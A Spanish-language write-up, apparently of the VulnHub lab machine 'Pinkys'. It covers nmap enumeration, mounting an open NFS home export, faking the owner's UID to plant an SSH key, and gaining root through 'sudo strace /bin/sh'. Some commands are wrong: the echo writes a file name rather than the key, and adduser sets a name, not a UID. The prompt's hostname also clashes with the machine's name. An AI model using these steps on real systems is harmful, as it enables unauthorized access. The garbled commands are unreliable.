---
layout: single
title: pinkys - VulnHub
excerpt: "Pinkys es una máquina vulnerable de VulnHub que cuenta con una vulnerabilidad que reside en una incorrecta configuración de montaje de archivos, que nos permite comprometer la máquina. El proceso de elevación de privilegios se basa en la explotación de una aplicación que con tiene permisos SUID."
date: 2023-10-08
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)

Pinkys es una máquina fácil, que contiene una vulnerabilidad que reside de una mala configuración de montaje, que nos permite comprometer la máquina. La elevación de privilegios consiste en una incorrecta gestión de permisos de archivos, esto nos permite ejecutar comandos como root.

## Enumeracion

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios(ssh,rpcbind,nfs,mountd,nlockmgr).

```bash
# Nmap 7.93 scan initiated Mon Sep 25 08:33:16 2023 as: nmap -sCV -p22,111,2049,41041,42917,42939,56679 -oN vulnscan.nmap 192.168.0.106
Nmap scan report for 192.168.0.106
Host is up (0.00028s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7a9bb9326f957710c0a0803534b1c000 (RSA)
|   256 240c7a8278182d66463b1a362206e1a1 (ECDSA)
|_  256 b915597885789ea5e616f6cf962d1d36 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41041/tcp   mountd
|   100005  1,2,3      43523/udp6  mountd
|   100005  1,2,3      50575/tcp6  mountd
|   100005  1,2,3      51299/udp   mountd
|   100021  1,3,4      42917/tcp   nlockmgr
|   100021  1,3,4      44393/tcp6  nlockmgr
|   100021  1,3,4      56691/udp   nlockmgr
|   100021  1,3,4      57572/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
41041/tcp open  mountd   1-3 (RPC #100005)
42917/tcp open  nlockmgr 1-4 (RPC #100021)
42939/tcp open  mountd   1-3 (RPC #100005)
56679/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:D8:9F:D6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 25 08:33:24 2023 -- 1 IP address (1 host up) scanned in 7.06 seconds 
```

## Analisis de puntos de montaje

La herramienta **showmount** permite visualizar sistemas de ficheros montados en un servidor.

```bash
➜  pinkys-palace showmount -e 192.168.0.106
Export list for 192.168.0.106:
/home/peter *
```

Realizamos una réplica local de la montura remota.

```bash
➜  pinkys-palace mount -t nfs  192.168.0.106:/home/peter /mnt/nft
➜  pinkys-palace ls -la /mnt/nft 
total 32
drwxr-xr-x 6 1001 1005 4096 sep 25  2023 .
drwxr-xr-x 1 root root    6 sep 24 21:59 ..
-rw-r--r-- 1 1001 1005  220 jul  9  2018 .bash_logout
-rw-r--r-- 1 1001 1005 3771 jul  9  2018 .bashrc
drwx------ 2 1001 1005 4096 jul 10  2018 .cache
-rw-rw-r-- 1 1001 1005    0 jul 10  2018 .cloud-locale-test.skip
drwx------ 3 1001 1005 4096 jul 10  2018 .gnupg
drwxrwxr-x 3 1001 1005 4096 jul 10  2018 .local
-rw-r--r-- 1 1001 1005  807 jul  9  2018 .profile
```

Según Hacktricks, si creamos un usuario con el ID 1001, podremos obtener acceso y crear contenido en todas las carpetas del sistema, lo que sugiere una vulnerabilidad o debilidad en la configuración de permisos del sistemas.
Por lo tanto creamos un usuario.

```bash
adduser --force-badname 1001
```

Una vez que hemos creado el usuario con el ID 1001, hemos obtenido la capacidad de crear y visualizar todos los archivos en el sistema. En consecuencia, hemos aprovechado esta oportunidad para tomar nuestra clave pública y generar un archivo denominado 'authorized_keys' en un directorio que hemos creado específicamente llamado '.ssh'. Esto nos ha habilitado el acceso al usuario 'peter' sin la necesidad de autenticación basada en contraseñas, permitiendo la autenticación mediante claves públicas.

```bash
➜  nft ls -la .ssh/authorized_keys 
-rw-r--r-- 1 1001 1001 565 sep 25  2023 .ssh/authorized_keys
➜  nft l
total 32K
drwxr-xr-x 6 1001 1005 4,0K sep 25  2023 .
drwxr-xr-x 1 root root    6 sep 24 21:59 ..
-rw-r--r-- 1 1001 1005  220 jul  9  2018 .bash_logout
-rw-r--r-- 1 1001 1005 3,7K jul  9  2018 .bashrc
drwx------ 2 1001 1005 4,0K jul 10  2018 .cache
-rw-rw-r-- 1 1001 1005    0 jul 10  2018 .cloud-locale-test.skip
drwx------ 3 1001 1005 4,0K jul 10  2018 .gnupg
drwxrwxr-x 3 1001 1005 4,0K jul 10  2018 .local
-rw-r--r-- 1 1001 1005  807 jul  9  2018 .profile
drwxr-xr-x 2 1001 1001 4,0K sep 25  2023 .ssh
```

Para generar las claves ssh lo hacemos de la siguiente manera.

```bash
ssh-keygen -t rsa
echo id_rsa.pub >> /mnt/nft/.ssh/authorized key
```

## Escalada de privilegios 

Cuando ingresamos a la máquina y ejecutamos el comando **sudo -l**. Observamos una incorrecta configuración de permisos de archivos. Esto nos permite acceder como root.

```bash
peter@linsecurity:~$ sudo -l
Matching Defaults entries for peter on linsecurity:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User peter may run the following commands on linsecurity:
    (ALL) NOPASSWD: /usr/bin/strace

```

### GTFOBins

GTFOBins nos indica que la utilidad 'strace' presenta una vulnerabilidad.

```bash
peter@linsecurity:~$ sudo strace -o /dev/null /bin/sh
# whoami
root
```

